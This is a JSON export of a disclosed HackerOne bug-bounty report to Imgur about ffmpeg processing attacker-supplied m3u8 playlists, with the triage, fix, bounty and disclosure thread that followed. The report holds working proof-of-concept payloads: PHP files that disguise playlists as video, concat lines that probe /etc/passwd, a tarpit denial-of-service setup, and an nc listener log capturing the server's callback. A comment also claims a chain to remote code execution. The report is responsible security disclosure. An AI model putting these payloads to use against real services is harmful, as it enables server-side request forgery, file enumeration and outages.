{"id":115978,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTU5Nzg=","url":"https://hackerone.com/reports/115978","title":"SSRF / Local file enumeration / DoS due to improper handling of certain file formats by ffmpeg","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-02-11T20:16:58.347Z","submitted_at":"2016-02-11T20:16:58.347Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aesteral","url":"/aesteral","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":638,"url":"https://hackerone.com/imgur","handle":"imgur","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Imgur","twitter_handle":"imgur","website":"http://imgur.com","about":"The most awesome images on the Internet."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-03-14T17:33:32.729Z","bug_reporter_agreed_on_going_public_at":"2016-03-14T17:29:21.255Z","team_member_agreed_on_going_public_at":"2016-03-14T17:33:32.427Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello!\n\nShort description\n========\n\nhttps://imgur.com/vidgif/upload endpoint is vulnerable to a SSRF/LFE vulnerability which allows an attacker to craft connections originating from imgur servers to any destination on the internet and imgur internal network and disclose lists of files located on imgur servers including sensitive data.\n\nWhy does the vulnerability exist?\n========\n\nimgur allows users to use 'video-to-gif' service. When a user requests conversion of such a video, imgur's servers perform an HTTP HEAD request to a user-supplied URL in order to discover the URL-s content-type and length. After that a user is offered a option to choose the required timestamps for beginning and end of converted video and then imgur performs another HTTP request (GET) to the same video file in order to grab the video file. After imgur downloads the video it evidently performs some sort of operations with ffmpeg (libav). However, ffmpeg has support of several special kinds of files which are not video files but 'playlists'. When processing such playlists ffmpeg performs commands contained and makes HTTP requests to urls listed in such playlists. We will use HTTP Live Streaming playlists (m3u8) in this example.\n\nAlthough imgur verifies content-types to ignore files which are not actually videos, ffmpeg does not care about such types and will parse a, say, video/avi files with m3u8 lines as a m3u8 file.\n\nExploits\n========\nBasic SSRF exploit\n--------------\nTo launch a basic SSRF we will prepare a php file which replies with video/avi content-type and m3u8 actual content. When parsing such a file, ffmpeg will make an unwanted HTTP GET request to an attacker-supplied URL.\n\nFirst, lets prepare a POST-dispatcher page:\n\nRequest: http://gradeco.ru/imgur/m3u8-dispatch.html\n\n```\n\u003cform action=\"https://imgur.com/vidgif/upload\" method=\"post\"\u003e\n\u003cinput type=\"hidden\" name=\"source\" value=\"http://gradeco.ru/imgur/m3u8.php\" /\u003e\n\u003cinput type=\"hidden\" name=\"url\" value=\"http://gradeco.ru/imgur/m3u8.php\" /\u003e\n\u003cinput type=\"hidden\" name=\"start\" value=\"0.1\" /\u003e\n\u003cinput type=\"hidden\" name=\"stop\" value=\"1.0\" /\u003e\n\u003cinput type=\"submit\" /\u003e\n\u003c/form\u003e\n```\n\nNow, lets prepare a 'video file' with the payload, we use php to supply a fake content-type\n\nRequest: http://gradeco.ru/imgur/m3u8.php\n\n```\n\u003c?php\n        header('Content-type: video/avi');\n        header('Content-Length: 1234'); // random content-length, imgur fails if none provided\n?\u003e\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://www.gradeco.ru:12346/BASICSSRF // ffmpeg on imgur side will make this request\n#EXT-X-ENDLIST\n```\n\nAfter ffmpeg parses the m3u8.php file imgur's server makes a request to an attacker's server:\n\n```\nevil.com:# nc -v -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nConnection from [54.82.61.224] port 12346 [tcp/*] accepted (family 2, sport 44251)\nGET /BASICSSRF HTTP/1.1\nUser-Agent: Lavf/55.48.100\nAccept: */*\nConnection: close\nHost: www.gradeco.ru:12346\n```\n\nWe can see our SSRF identification token ('BASICSSRF') present and some information disclosure - lavf version 55.48.100.\n\nSimple local file enumeration exploit\n---------\n\nAs we can only perform HTTP GET-s with this vulnerability we have to somehow procure more information. Fortunately, ffmpeg m3u8 support provides us with a useful CONCAT command which allows us to concatenate multiple sources. It also fails if source is not present.\n\nTo utilize that lets prepare a new m3u8-2.php file:\n\n```\n\u003c?php\n        header('content-type: video/avi');\n        header('content-length: 1234');\n?\u003e\n#EXTM3U\n#EXT-X-PLAYLIST-TYPE:VOD\n#EXT-X-TARGETDURATION:1\n#EXT-X-VERSION:3\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:file:///etc/passwd|http://gradeco.ru:12346/\n#EXT-X-ENDLIST\n```\n\nIf provided with this file, imgur's server will contact gradeco.ru:12346 in case if /etc/passwd exists and won't if it does not exist. In this way an attacker may easily enumerate files.\n\nDenial of service exploit:\n-------\nTo perform a denial of service attack an attacker may prepare a specially crafted YUV4 file which will hang ffmpeg and keep it on constantly performing HTTP GET requests. To do so lets create a separate file with a correct m3u8 header:\n\nhttp://gradeco.ru/imgur/m3u8-head.m3u8\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://gradeco.ru:12346/?.txt\n```\n\nand a 'video file' \n\nhttp://gradeco.ru/imgur/m3u8-dos.php\n\n```\n\u003c?php\n        header('Content-type: video/avi');\n        header('Content-length: 1');\n?\u003e\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://www.gradeco.ru/imgur/m3u8-head.m3u8?2|file:///etc/issue\n#EXT-X-ENDLIST\n```\n\nRedirect port 12346 to TARPIT and then request conversion by sending a following post request:\n\n```\nsource: http://gradeco.ru/imgur/m3u8-dos.php\nstart: 0.1\nstop: 10\n```\n\nimgur service will request port 12346, end up in TARPIT and then wait forever for 10 seconds of video to be delivered. That means that it will have an open socket and open process which may lead to resource exhaustion.\n\n","vulnerability_information_html":"\u003cp\u003eHello!\u003c/p\u003e\n\n\u003ch1 id=\"short-description\"\u003eShort description\u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"https://imgur.com/vidgif/upload\" href=\"/redirect?url=https%3A%2F%2Fimgur.com%2Fvidgif%2Fupload\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://imgur.com/vidgif/upload\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e endpoint is vulnerable to a SSRF/LFE vulnerability which allows an attacker to craft connections originating from imgur servers to any destination on the internet and imgur internal network and disclose lists of files located on imgur servers including sensitive data.\u003c/p\u003e\n\n\u003ch1 id=\"why-does-the-vulnerability-exist\"\u003eWhy does the vulnerability exist?\u003c/h1\u003e\n\n\u003cp\u003eimgur allows users to use \u0026#39;video-to-gif\u0026#39; service. When a user requests conversion of such a video, imgur\u0026#39;s servers perform an HTTP HEAD request to a user-supplied URL in order to discover the URL-s content-type and length. After that a user is offered a option to choose the required timestamps for beginning and end of converted video and then imgur performs another HTTP request (GET) to the same video file in order to grab the video file. After imgur downloads the video it evidently performs some sort of operations with ffmpeg (libav). However, ffmpeg has support of several special kinds of files which are not video files but \u0026#39;playlists\u0026#39;. When processing such playlists ffmpeg performs commands contained and makes HTTP requests to urls listed in such playlists. We will use HTTP Live Streaming playlists (m3u8) in this example.\u003c/p\u003e\n\n\u003cp\u003eAlthough imgur verifies content-types to ignore files which are not actually videos, ffmpeg does not care about such types and will parse a, say, video/avi files with m3u8 lines as a m3u8 file.\u003c/p\u003e\n\n\u003ch1 id=\"exploits\"\u003eExploits\u003c/h1\u003e\n\n\u003ch2 id=\"basic-ssrf-exploit\"\u003eBasic SSRF exploit\u003c/h2\u003e\n\n\u003cp\u003eTo launch a basic SSRF we will prepare a php file which replies with video/avi content-type and m3u8 actual content. When parsing such a file, ffmpeg will make an unwanted HTTP GET request to an attacker-supplied URL.\u003c/p\u003e\n\n\u003cp\u003eFirst, lets prepare a POST-dispatcher page:\u003c/p\u003e\n\n\u003cp\u003eRequest: \u003ca title=\"http://gradeco.ru/imgur/m3u8-dispatch.html\" href=\"/redirect?url=http%3A%2F%2Fgradeco.ru%2Fimgur%2Fm3u8-dispatch.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gradeco.ru/imgur/m3u8-dispatch.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;form action=\u0026quot;https://imgur.com/vidgif/upload\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;source\u0026quot; value=\u0026quot;http://gradeco.ru/imgur/m3u8.php\u0026quot; /\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;url\u0026quot; value=\u0026quot;http://gradeco.ru/imgur/m3u8.php\u0026quot; /\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;start\u0026quot; value=\u0026quot;0.1\u0026quot; /\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;stop\u0026quot; value=\u0026quot;1.0\u0026quot; /\u0026gt;\n\u0026lt;input type=\u0026quot;submit\u0026quot; /\u0026gt;\n\u0026lt;/form\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow, lets prepare a \u0026#39;video file\u0026#39; with the payload, we use php to supply a fake content-type\u003c/p\u003e\n\n\u003cp\u003eRequest: \u003ca title=\"http://gradeco.ru/imgur/m3u8.php\" href=\"/redirect?url=http%3A%2F%2Fgradeco.ru%2Fimgur%2Fm3u8.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gradeco.ru/imgur/m3u8.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Content-type: video/avi\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Content-Length: 1234\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// random content-length, imgur fails if none provided\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://www.gradeco.ru:12346/BASICSSRF // ffmpeg on imgur side will make this request\n#EXT-X-ENDLIST\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter ffmpeg parses the m3u8.php file imgur\u0026#39;s server makes a request to an attacker\u0026#39;s server:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eevil.com:# nc -v -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nConnection from [54.82.61.224] port 12346 [tcp/*] accepted (family 2, sport 44251)\nGET /BASICSSRF HTTP/1.1\nUser-Agent: Lavf/55.48.100\nAccept: */*\nConnection: close\nHost: www.gradeco.ru:12346\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can see our SSRF identification token (\u0026#39;BASICSSRF\u0026#39;) present and some information disclosure - lavf version 55.48.100.\u003c/p\u003e\n\n\u003ch2 id=\"simple-local-file-enumeration-exploit\"\u003eSimple local file enumeration exploit\u003c/h2\u003e\n\n\u003cp\u003eAs we can only perform HTTP GET-s with this vulnerability we have to somehow procure more information. Fortunately, ffmpeg m3u8 support provides us with a useful CONCAT command which allows us to concatenate multiple sources. It also fails if source is not present.\u003c/p\u003e\n\n\u003cp\u003eTo utilize that lets prepare a new m3u8-2.php file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;content-type: video/avi\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;content-length: 1234\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n#EXTM3U\n#EXT-X-PLAYLIST-TYPE:VOD\n#EXT-X-TARGETDURATION:1\n#EXT-X-VERSION:3\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:file:///etc/passwd|http://gradeco.ru:12346/\n#EXT-X-ENDLIST\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf provided with this file, imgur\u0026#39;s server will contact gradeco.ru:12346 in case if /etc/passwd exists and won\u0026#39;t if it does not exist. In this way an attacker may easily enumerate files.\u003c/p\u003e\n\n\u003ch2 id=\"denial-of-service-exploit\"\u003eDenial of service exploit:\u003c/h2\u003e\n\n\u003cp\u003eTo perform a denial of service attack an attacker may prepare a specially crafted YUV4 file which will hang ffmpeg and keep it on constantly performing HTTP GET requests. To do so lets create a separate file with a correct m3u8 header:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://gradeco.ru/imgur/m3u8-head.m3u8\" href=\"/redirect?url=http%3A%2F%2Fgradeco.ru%2Fimgur%2Fm3u8-head.m3u8\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gradeco.ru/imgur/m3u8-head.m3u8\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://gradeco.ru:12346/?.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand a \u0026#39;video file\u0026#39; \u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://gradeco.ru/imgur/m3u8-dos.php\" href=\"/redirect?url=http%3A%2F%2Fgradeco.ru%2Fimgur%2Fm3u8-dos.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gradeco.ru/imgur/m3u8-dos.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Content-type: video/avi\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Content-length: 1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://www.gradeco.ru/imgur/m3u8-head.m3u8?2|file:///etc/issue\n#EXT-X-ENDLIST\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRedirect port 12346 to TARPIT and then request conversion by sending a following post request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esource: http://gradeco.ru/imgur/m3u8-dos.php\nstart: 0.1\nstop: 10\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eimgur service will request port 12346, end up in TARPIT and then wait forever for 10 seconds of video to be delivered. That means that it will have an open socket and open process which may lead to resource exhaustion.\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-04-13T17:29:21.767Z","allow_singular_disclosure_after":-148646939.2312327,"singular_disclosure_allowed":true,"vote_count":7,"voters":["michiel","aesteral","retr0id","mogyhacker","dyabla","dr_set","xyzt1996"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":794952,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm quite sure it is possible to do LFI if you succeed to CONCAT a valid header with file contents, which may cause information disclosure via resulting gif. Unfortunately it is hard to test without access to ffmpeg error logs.\n\nAlso other protocols available in m3u8 files, for example,\nftp://, gopher://, tcp:// which allows other kinds of SSRF.","markdown_message":"\u003cp\u003eI\u0026#39;m quite sure it is possible to do LFI if you succeed to CONCAT a valid header with file contents, which may cause information disclosure via resulting gif. Unfortunately it is hard to test without access to ffmpeg error logs.\u003c/p\u003e\n\n\u003cp\u003eAlso other protocols available in m3u8 files, for example,\u003cbr\u003e\nftp://, gopher://, tcp:// which allows other kinds of SSRF.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-11T20:19:06.566Z","updated_at":"2016-02-11T20:19:06.566Z","actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":801268,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Important update: it seems that this issue also leads to an RCE due to CVE-2015-7457 glibc vulnerability.\n\nI've set up a test case at source: http://gradeco.ru/imgur/m3u8-cve.php, it makes ffmpeg to request http://imgurtests.tk/imgur/head.avi file, all DNS requests to imgurtests.tk deliver CVE-2015-7457 payload. If ffmpeg segfaults on imgur side (can't verify it but the signs show it does segfault) it means that #115978 can be easily chained with CVE-2015-7457 which leads to full RCE.","markdown_message":"\u003cp\u003eImportant update: it seems that this issue also leads to an RCE due to CVE-2015-7457 glibc vulnerability.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve set up a test case at source: \u003ca title=\"http://gradeco.ru/imgur/m3u8-cve.php\" href=\"/redirect?url=http%3A%2F%2Fgradeco.ru%2Fimgur%2Fm3u8-cve.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gradeco.ru/imgur/m3u8-cve.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, it makes ffmpeg to request \u003ca title=\"http://imgurtests.tk/imgur/head.avi\" href=\"/redirect?url=http%3A%2F%2Fimgurtests.tk%2Fimgur%2Fhead.avi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://imgurtests.tk/imgur/head.avi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e file, all DNS requests to imgurtests.tk deliver CVE-2015-7457 payload. If ffmpeg segfaults on imgur side (can\u0026#39;t verify it but the signs show it does segfault) it means that \u003ca href=\"/reports/115978\"\u003e#115978\u003c/a\u003e can be easily chained with CVE-2015-7457 which leads to full RCE.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-17T11:52:01.935Z","updated_at":"2016-02-17T11:52:01.935Z","actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":801269,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a CVE-2015-7457 test PoC: http://gradeco.ru/imgur/m3u8-dispatch-cve.html, please verify if it leads to a segfault of ffmpeg on imgur's side.","markdown_message":"\u003cp\u003eHere is a CVE-2015-7457 test PoC: \u003ca title=\"http://gradeco.ru/imgur/m3u8-dispatch-cve.html\" href=\"/redirect?url=http%3A%2F%2Fgradeco.ru%2Fimgur%2Fm3u8-dispatch-cve.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gradeco.ru/imgur/m3u8-dispatch-cve.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, please verify if it leads to a segfault of ffmpeg on imgur\u0026#39;s side.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-17T11:54:16.150Z","updated_at":"2016-02-17T11:54:16.150Z","actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":803081,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!","markdown_message":"\u003cp\u003eWe have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-18T17:47:30.009Z","updated_at":"2016-02-18T17:47:30.009Z","actor":{"username":"kcramer","cleared":false,"url":"/kcramer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":816999,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi! Can you give me an update regarding this issue? Thanks!","markdown_message":"\u003cp\u003eHi! Can you give me an update regarding this issue? Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-29T13:26:52.106Z","updated_at":"2016-02-29T13:26:52.106Z","actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":838545,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, I see that issue was resolved as imgur does not process m3u8 playlists anymore, can you please confirm?","markdown_message":"\u003cp\u003eHello, I see that issue was resolved as imgur does not process m3u8 playlists anymore, can you please confirm?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-14T15:25:14.797Z","updated_at":"2016-03-14T15:25:14.797Z","actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":838798,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey, sorry about that. We merged a fix but didn't close the issue that was tied to it. I confirmed we've fixed this. Thanks for double checking with us!","markdown_message":"\u003cp\u003eHey, sorry about that. We merged a fix but didn\u0026#39;t close the issue that was tied to it. I confirmed we\u0026#39;ve fixed this. Thanks for double checking with us!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-14T17:20:17.836Z","updated_at":"2016-03-14T17:20:17.836Z","actor":{"username":"kcramer","cleared":false,"url":"/kcramer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"aesteral","url":"/aesteral"},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":838806,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great, thanks for fixing! Do you find this eligible for a bounty by any chance? ","markdown_message":"\u003cp\u003eGreat, thanks for fixing! Do you find this eligible for a bounty by any chance? \u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-14T17:22:19.721Z","updated_at":"2016-03-14T17:22:19.721Z","actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":838829,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Yeah! Sorry, was working on figuring out the amount.","markdown_message":"\u003cp\u003eYeah! Sorry, was working on figuring out the amount.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-14T17:28:20.138Z","updated_at":"2016-03-14T17:28:20.138Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"bounty_amount":"1000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"imgur","collaborator":{"username":"aesteral","url":"/aesteral"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":838833,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Awesome, thank you! I kindly ask you to allow disclosure.","markdown_message":"\u003cp\u003eAwesome, thank you! I kindly ask you to allow disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-14T17:29:21.278Z","updated_at":"2016-03-14T17:29:21.278Z","first_to_agree":true,"actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":838849,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-14T17:33:32.455Z","updated_at":"2016-03-14T17:33:32.455Z","actor":{"username":"kcramer","cleared":false,"url":"/kcramer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":838850,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-14T17:33:32.749Z","updated_at":"2016-03-14T17:33:32.749Z","actor":{"username":"kcramer","cleared":false,"url":"/kcramer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone